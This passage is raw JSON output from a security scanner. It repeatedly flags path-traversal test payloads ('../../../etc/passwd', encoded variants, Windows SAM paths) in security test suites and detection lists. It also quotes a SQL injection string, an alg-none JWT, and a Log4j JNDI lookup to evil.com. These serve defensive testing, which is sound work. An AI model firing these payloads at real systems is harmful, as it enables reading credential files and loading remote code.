            "context": "    test_cases = [\n        (\"/tmp/test.txt\", True),\n        (\"../../../etc/passwd\", False),\n        (\"normal_file.log\", True),\n        (\"C:\\\\Windows\\\\system32\\\\config\", False),",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/test_input_validation.py",
            "line": 103,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../../../etc/passwd\", False),",
            "context": "    test_cases = [\n        (\"/tmp/test.txt\", True),\n        (\"../../../etc/passwd\", False),\n        (\"normal_file.log\", True),\n        (\"C:\\\\Windows\\\\system32\\\\config\", False),",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/test_input_validation.py",
            "line": 103,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../../../etc/passwd\", False),",
            "context": "    test_cases = [\n        (\"/tmp/test.txt\", True),\n        (\"../../../etc/passwd\", False),\n        (\"normal_file.log\", True),\n        (\"C:\\\\Windows\\\\system32\\\\config\", False),",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/test_input_validation.py",
            "line": 103,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../../../etc/passwd\", False),",
            "context": "    test_cases = [\n        (\"/tmp/test.txt\", True),\n        (\"../../../etc/passwd\", False),\n        (\"normal_file.log\", True),\n        (\"C:\\\\Windows\\\\system32\\\\config\", False),",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/test_input_validation.py",
            "line": 103,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../../../etc/passwd\", False),",
            "context": "    test_cases = [\n        (\"/tmp/test.txt\", True),\n        (\"../../../etc/passwd\", False),\n        (\"normal_file.log\", True),\n        (\"C:\\\\Windows\\\\system32\\\\config\", False),",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/test_input_validation.py",
            "line": 103,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../../../etc/passwd\", False),",
            "context": "    test_cases = [\n        (\"/tmp/test.txt\", True),\n        (\"../../../etc/passwd\", False),\n        (\"normal_file.log\", True),\n        (\"C:\\\\Windows\\\\system32\\\\config\", False),",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_scan.py",
            "line": 102,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"path_traversal\": [\"../\", \"..\\\\\\\\\"]",
            "context": "            \"sql_injection\": [\"execute(\", \"raw(\"],\n            \"command_injection\": [\"os.system(\", \"subprocess.call(\"],\n            \"path_traversal\": [\"../\", \"..\\\\\\\\\"]\n        }\n        ",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_scan.py",
            "line": 102,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"path_traversal\": [\"../\", \"..\\\\\\\\\"]",
            "context": "            \"sql_injection\": [\"execute(\", \"raw(\"],\n            \"command_injection\": [\"os.system(\", \"subprocess.call(\"],\n            \"path_traversal\": [\"../\", \"..\\\\\\\\\"]\n        }\n        ",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_scan.py",
            "line": 102,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"path_traversal\": [\"../\", \"..\\\\\\\\\"]",
            "context": "            \"sql_injection\": [\"execute(\", \"raw(\"],\n            \"command_injection\": [\"os.system(\", \"subprocess.call(\"],\n            \"path_traversal\": [\"../\", \"..\\\\\\\\\"]\n        }\n        ",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/run_security_audit.py",
            "line": 107,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../etc/passwd\",  # Path traversal",
            "context": "            \"Bearer \",  # Empty bearer\n            \"eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.\",  # Algorithm none attack\n            \"../../../etc/passwd\",  # Path traversal\n            \"admin' OR '1'='1\",  # SQL injection\n            \"${jndi:ldap://evil.com/a}\",  # Log4j style injection",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/run_security_audit.py",
            "line": 107,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../etc/passwd\",  # Path traversal",
            "context": "            \"Bearer \",  # Empty bearer\n            \"eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.\",  # Algorithm none attack\n            \"../../../etc/passwd\",  # Path traversal\n            \"admin' OR '1'='1\",  # SQL injection\n            \"${jndi:ldap://evil.com/a}\",  # Log4j style injection",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/run_security_audit.py",
            "line": 107,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../etc/passwd\",  # Path traversal",
            "context": "            \"Bearer \",  # Empty bearer\n            \"eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.\",  # Algorithm none attack\n            \"../../../etc/passwd\",  # Path traversal\n            \"admin' OR '1'='1\",  # SQL injection\n            \"${jndi:ldap://evil.com/a}\",  # Log4j style injection",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/run_security_audit.py",
            "line": 107,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../etc/passwd\",  # Path traversal",
            "context": "            \"Bearer \",  # Empty bearer\n            \"eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.\",  # Algorithm none attack\n            \"../../../etc/passwd\",  # Path traversal\n            \"admin' OR '1'='1\",  # SQL injection\n            \"${jndi:ldap://evil.com/a}\",  # Log4j style injection",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/run_security_audit.py",
            "line": 107,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../etc/passwd\",  # Path traversal",
            "context": "            \"Bearer \",  # Empty bearer\n            \"eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.\",  # Algorithm none attack\n            \"../../../etc/passwd\",  # Path traversal\n            \"admin' OR '1'='1\",  # SQL injection\n            \"${jndi:ldap://evil.com/a}\",  # Log4j style injection",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/run_security_audit.py",
            "line": 107,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../etc/passwd\",  # Path traversal",
            "context": "            \"Bearer \",  # Empty bearer\n            \"eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.\",  # Algorithm none attack\n            \"../../../etc/passwd\",  # Path traversal\n            \"admin' OR '1'='1\",  # SQL injection\n            \"${jndi:ldap://evil.com/a}\",  # Log4j style injection",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/run_security_audit.py",
            "line": 225,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../etc/passwd\",",
            "context": "        \"\"\"Test path traversal pattern detection\"\"\"\n        path_payloads = [\n            \"../../../etc/passwd\",\n            \"..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam\",\n            \"....//....//....//etc/passwd\",",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/run_security_audit.py",
            "line": 225,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../etc/passwd\",",
            "context": "        \"\"\"Test path traversal pattern detection\"\"\"\n        path_payloads = [\n            \"../../../etc/passwd\",\n            \"..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam\",\n            \"....//....//....//etc/passwd\",",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/run_security_audit.py",
            "line": 225,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../etc/passwd\",",
            "context": "        \"\"\"Test path traversal pattern detection\"\"\"\n        path_payloads = [\n            \"../../../etc/passwd\",\n            \"..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam\",\n            \"....//....//....//etc/passwd\",",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/run_security_audit.py",
            "line": 225,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../etc/passwd\",",
            "context": "        \"\"\"Test path traversal pattern detection\"\"\"\n        path_payloads = [\n            \"../../../etc/passwd\",\n            \"..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam\",\n            \"....//....//....//etc/passwd\",",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/run_security_audit.py",
            "line": 225,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../etc/passwd\",",
            "context": "        \"\"\"Test path traversal pattern detection\"\"\"\n        path_payloads = [\n            \"../../../etc/passwd\",\n            \"..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam\",\n            \"....//....//....//etc/passwd\",",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/run_security_audit.py",
            "line": 225,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../etc/passwd\",",
            "context": "        \"\"\"Test path traversal pattern detection\"\"\"\n        path_payloads = [\n            \"../../../etc/passwd\",\n            \"..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam\",\n            \"....//....//....//etc/passwd\",",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/run_security_audit.py",
            "line": 227,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"....//....//....//etc/passwd\",",
            "context": "            \"../../../etc/passwd\",\n            \"..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam\",\n            \"....//....//....//etc/passwd\",\n            \"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd\",\n            \"/var/www/../../etc/passwd\",",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/run_security_audit.py",
            "line": 227,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"....//....//....//etc/passwd\",",
            "context": "            \"../../../etc/passwd\",\n            \"..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam\",\n            \"....//....//....//etc/passwd\",\n            \"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd\",\n            \"/var/www/../../etc/passwd\",",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/run_security_audit.py",
            "line": 227,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"....//....//....//etc/passwd\",",
            "context": "            \"../../../etc/passwd\",\n            \"..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam\",\n            \"....//....//....//etc/passwd\",\n            \"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd\",\n            \"/var/www/../../etc/passwd\",",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/run_security_audit.py",
            "line": 227,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"....//....//....//etc/passwd\",",
            "context": "            \"../../../etc/passwd\",\n            \"..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam\",\n            \"....//....//....//etc/passwd\",\n            \"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd\",\n            \"/var/www/../../etc/passwd\",",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/run_security_audit.py",
            "line": 227,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"....//....//....//etc/passwd\",",
            "context": "            \"../../../etc/passwd\",\n            \"..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam\",\n            \"....//....//....//etc/passwd\",\n            \"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd\",\n            \"/var/www/../../etc/passwd\",",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/run_security_audit.py",
            "line": 227,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"....//....//....//etc/passwd\",",
            "context": "            \"../../../etc/passwd\",\n            \"..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam\",\n            \"....//....//....//etc/passwd\",\n            \"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd\",\n            \"/var/www/../../etc/passwd\",",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/run_security_audit.py",
            "line": 229,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"/var/www/../../etc/passwd\",",
            "context": "            \"....//....//....//etc/passwd\",\n            \"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd\",\n            \"/var/www/../../etc/passwd\",\n            \"C:\\\\..\\\\..\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts\",\n        ]",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/run_security_audit.py",
            "line": 229,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"/var/www/../../etc/passwd\",",
            "context": "            \"....//....//....//etc/passwd\",\n            \"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd\",\n            \"/var/www/../../etc/passwd\",\n            \"C:\\\\..\\\\..\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts\",\n        ]",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/run_security_audit.py",
            "line": 229,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"/var/www/../../etc/passwd\",",
            "context": "            \"....//....//....//etc/passwd\",\n            \"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd\",\n            \"/var/www/../../etc/passwd\",\n            \"C:\\\\..\\\\..\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts\",\n        ]",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/run_security_audit.py",
            "line": 229,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"/var/www/../../etc/passwd\",",
            "context": "            \"....//....//....//etc/passwd\",\n            \"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd\",\n            \"/var/www/../../etc/passwd\",\n            \"C:\\\\..\\\\..\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts\",\n        ]",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/run_security_audit.py",
            "line": 442,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../\",",
            "context": "            \"null\", \n            \"undefined\",\n            \"../\",\n            \"'\",\n            \"SELECT\",",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/run_security_audit.py",
            "line": 442,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../\",",
            "context": "            \"null\", \n            \"undefined\",\n            \"../\",\n            \"'\",\n            \"SELECT\",",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/comprehensive_test_suite.py",
            "line": 487,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "payload = {\"file\": \"../../../etc/passwd\"}",
            "context": "    \n    # Command injection attempt\n    payload = {\"file\": \"../../../etc/passwd\"}\n    response = requests.get(\"http://localhost:8082/api/file\", params=payload)\n    ",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/comprehensive_test_suite.py",
            "line": 487,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "payload = {\"file\": \"../../../etc/passwd\"}",
            "context": "    \n    # Command injection attempt\n    payload = {\"file\": \"../../../etc/passwd\"}\n    response = requests.get(\"http://localhost:8082/api/file\", params=payload)\n    ",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/comprehensive_test_suite.py",
            "line": 487,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "payload = {\"file\": \"../../../etc/passwd\"}",
            "context": "    \n    # Command injection attempt\n    payload = {\"file\": \"../../../etc/passwd\"}\n    response = requests.get(\"http://localhost:8082/api/file\", params=payload)\n    ",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/comprehensive_test_suite.py",
            "line": 487,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "payload = {\"file\": \"../../../etc/passwd\"}",
            "context": "    \n    # Command injection attempt\n    payload = {\"file\": \"../../../etc/passwd\"}\n    response = requests.get(\"http://localhost:8082/api/file\", params=payload)\n    ",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/comprehensive_test_suite.py",
            "line": 487,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "payload = {\"file\": \"../../../etc/passwd\"}",
            "context": "    \n    # Command injection attempt\n    payload = {\"file\": \"../../../etc/passwd\"}\n    response = requests.get(\"http://localhost:8082/api/file\", params=payload)\n    ",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/comprehensive_test_suite.py",
            "line": 487,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "payload = {\"file\": \"../../../etc/passwd\"}",
            "context": "    \n    # Command injection attempt\n    payload = {\"file\": \"../../../etc/passwd\"}\n    response = requests.get(\"http://localhost:8082/api/file\", params=payload)\n    ",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/run_enhanced_security_audit.py",
            "line": 95,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../../../etc/passwd\", False, \"Basic parent directory traversal\"),",
            "context": "            test_cases = [\n                # Basic traversal attempts\n                (\"../../../etc/passwd\", False, \"Basic parent directory traversal\"),\n                (\"..\\\\..\\\\..\\\\windows\\\\system32\", False, \"Windows-style traversal\"),\n                (\"~/../../etc/passwd\", False, \"Home directory traversal\"),",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/run_enhanced_security_audit.py",
            "line": 95,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../../../etc/passwd\", False, \"Basic parent directory traversal\"),",
            "context": "            test_cases = [\n                # Basic traversal attempts\n                (\"../../../etc/passwd\", False, \"Basic parent directory traversal\"),\n                (\"..\\\\..\\\\..\\\\windows\\\\system32\", False, \"Windows-style traversal\"),\n                (\"~/../../etc/passwd\", False, \"Home directory traversal\"),",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/run_enhanced_security_audit.py",
            "line": 95,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../../../etc/passwd\", False, \"Basic parent directory traversal\"),",
            "context": "            test_cases = [\n                # Basic traversal attempts\n                (\"../../../etc/passwd\", False, \"Basic parent directory traversal\"),\n                (\"..\\\\..\\\\..\\\\windows\\\\system32\", False, \"Windows-style traversal\"),\n                (\"~/../../etc/passwd\", False, \"Home directory traversal\"),",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/run_enhanced_security_audit.py",
            "line": 95,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../../../etc/passwd\", False, \"Basic parent directory traversal\"),",
            "context": "            test_cases = [\n                # Basic traversal attempts\n                (\"../../../etc/passwd\", False, \"Basic parent directory traversal\"),\n                (\"..\\\\..\\\\..\\\\windows\\\\system32\", False, \"Windows-style traversal\"),\n                (\"~/../../etc/passwd\", False, \"Home directory traversal\"),",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/run_enhanced_security_audit.py",
            "line": 95,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../../../etc/passwd\", False, \"Basic parent directory traversal\"),",
            "context": "            test_cases = [\n                # Basic traversal attempts\n                (\"../../../etc/passwd\", False, \"Basic parent directory traversal\"),\n                (\"..\\\\..\\\\..\\\\windows\\\\system32\", False, \"Windows-style traversal\"),\n                (\"~/../../etc/passwd\", False, \"Home directory traversal\"),",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/run_enhanced_security_audit.py",
            "line": 95,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../../../etc/passwd\", False, \"Basic parent directory traversal\"),",
            "context": "            test_cases = [\n                # Basic traversal attempts\n                (\"../../../etc/passwd\", False, \"Basic parent directory traversal\"),\n                (\"..\\\\..\\\\..\\\\windows\\\\system32\", False, \"Windows-style traversal\"),\n                (\"~/../../etc/passwd\", False, \"Home directory traversal\"),",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/run_enhanced_security_audit.py",
            "line": 97,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"~/../../etc/passwd\", False, \"Home directory traversal\"),",
            "context": "                (\"../../../etc/passwd\", False, \"Basic parent directory traversal\"),\n                (\"..\\\\..\\\\..\\\\windows\\\\system32\", False, \"Windows-style traversal\"),\n                (\"~/../../etc/passwd\", False, \"Home directory traversal\"),\n                \n                # URL-encoded traversal attempts (these were failing before)",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/run_enhanced_security_audit.py",
            "line": 97,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"~/../../etc/passwd\", False, \"Home directory traversal\"),",
            "context": "                (\"../../../etc/passwd\", False, \"Basic parent directory traversal\"),\n                (\"..\\\\..\\\\..\\\\windows\\\\system32\", False, \"Windows-style traversal\"),\n                (\"~/../../etc/passwd\", False, \"Home directory traversal\"),\n                \n                # URL-encoded traversal attempts (these were failing before)",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/run_enhanced_security_audit.py",
            "line": 97,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"~/../../etc/passwd\", False, \"Home directory traversal\"),",
            "context": "                (\"../../../etc/passwd\", False, \"Basic parent directory traversal\"),\n                (\"..\\\\..\\\\..\\\\windows\\\\system32\", False, \"Windows-style traversal\"),\n                (\"~/../../etc/passwd\", False, \"Home directory traversal\"),\n                \n                # URL-encoded traversal attempts (these were failing before)",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/run_enhanced_security_audit.py",
            "line": 97,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"~/../../etc/passwd\", False, \"Home directory traversal\"),",
            "context": "                (\"../../../etc/passwd\", False, \"Basic parent directory traversal\"),\n                (\"..\\\\..\\\\..\\\\windows\\\\system32\", False, \"Windows-style traversal\"),\n                (\"~/../../etc/passwd\", False, \"Home directory traversal\"),\n                \n                # URL-encoded traversal attempts (these were failing before)",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/run_enhanced_security_audit.py",
            "line": 100,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd\", False, \"URL-encoded ../../../etc/passwd\"),",
            "context": "                \n                # URL-encoded traversal attempts (these were failing before)\n                (\"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd\", False, \"URL-encoded ../../../etc/passwd\"),\n                (\"%2e%2e/%2e%2e/%2e%2e/etc/passwd\", False, \"Mixed encoding traversal\"),\n                (\"..%2f..%2f..%2fetc%2fpasswd\", False, \"Partial URL encoding\"),",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/run_enhanced_security_audit.py",
            "line": 100,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd\", False, \"URL-encoded ../../../etc/passwd\"),",
            "context": "                \n                # URL-encoded traversal attempts (these were failing before)\n                (\"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd\", False, \"URL-encoded ../../../etc/passwd\"),\n                (\"%2e%2e/%2e%2e/%2e%2e/etc/passwd\", False, \"Mixed encoding traversal\"),\n                (\"..%2f..%2f..%2fetc%2fpasswd\", False, \"Partial URL encoding\"),",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/run_enhanced_security_audit.py",
            "line": 100,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd\", False, \"URL-encoded ../../../etc/passwd\"),",
            "context": "                \n                # URL-encoded traversal attempts (these were failing before)\n                (\"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd\", False, \"URL-encoded ../../../etc/passwd\"),\n                (\"%2e%2e/%2e%2e/%2e%2e/etc/passwd\", False, \"Mixed encoding traversal\"),\n                (\"..%2f..%2f..%2fetc%2fpasswd\", False, \"Partial URL encoding\"),",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/run_enhanced_security_audit.py",
            "line": 100,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd\", False, \"URL-encoded ../../../etc/passwd\"),",
            "context": "                \n                # URL-encoded traversal attempts (these were failing before)\n                (\"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd\", False, \"URL-encoded ../../../etc/passwd\"),\n                (\"%2e%2e/%2e%2e/%2e%2e/etc/passwd\", False, \"Mixed encoding traversal\"),\n                (\"..%2f..%2f..%2fetc%2fpasswd\", False, \"Partial URL encoding\"),",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/run_enhanced_security_audit.py",
            "line": 100,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd\", False, \"URL-encoded ../../../etc/passwd\"),",
            "context": "                \n                # URL-encoded traversal attempts (these were failing before)\n                (\"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd\", False, \"URL-encoded ../../../etc/passwd\"),\n                (\"%2e%2e/%2e%2e/%2e%2e/etc/passwd\", False, \"Mixed encoding traversal\"),\n                (\"..%2f..%2f..%2fetc%2fpasswd\", False, \"Partial URL encoding\"),",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/run_enhanced_security_audit.py",
            "line": 100,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd\", False, \"URL-encoded ../../../etc/passwd\"),",
            "context": "                \n                # URL-encoded traversal attempts (these were failing before)\n                (\"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd\", False, \"URL-encoded ../../../etc/passwd\"),\n                (\"%2e%2e/%2e%2e/%2e%2e/etc/passwd\", False, \"Mixed encoding traversal\"),\n                (\"..%2f..%2f..%2fetc%2fpasswd\", False, \"Partial URL encoding\"),",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/run_enhanced_security_audit.py",
            "line": 114,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"...//...//etc/passwd\", False, \"Triple dots traversal\"),",
            "context": "                # Mixed case and creative attempts\n                (\"..%2F..%2F..%2Fetc%2Fpasswd\", False, \"Mixed case encoding\"),\n                (\"...//...//etc/passwd\", False, \"Triple dots traversal\"),\n                (\".%2e/.%2e/.%2e/etc/passwd\", False, \"Mixed dot encoding\"),\n                ",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/run_enhanced_security_audit.py",
            "line": 114,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"...//...//etc/passwd\", False, \"Triple dots traversal\"),",
            "context": "                # Mixed case and creative attempts\n                (\"..%2F..%2F..%2Fetc%2Fpasswd\", False, \"Mixed case encoding\"),\n                (\"...//...//etc/passwd\", False, \"Triple dots traversal\"),\n                (\".%2e/.%2e/.%2e/etc/passwd\", False, \"Mixed dot encoding\"),\n                ",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/run_enhanced_security_audit.py",
            "line": 114,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"...//...//etc/passwd\", False, \"Triple dots traversal\"),",
            "context": "                # Mixed case and creative attempts\n                (\"..%2F..%2F..%2Fetc%2Fpasswd\", False, \"Mixed case encoding\"),\n                (\"...//...//etc/passwd\", False, \"Triple dots traversal\"),\n                (\".%2e/.%2e/.%2e/etc/passwd\", False, \"Mixed dot encoding\"),\n                ",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/run_enhanced_security_audit.py",
            "line": 114,
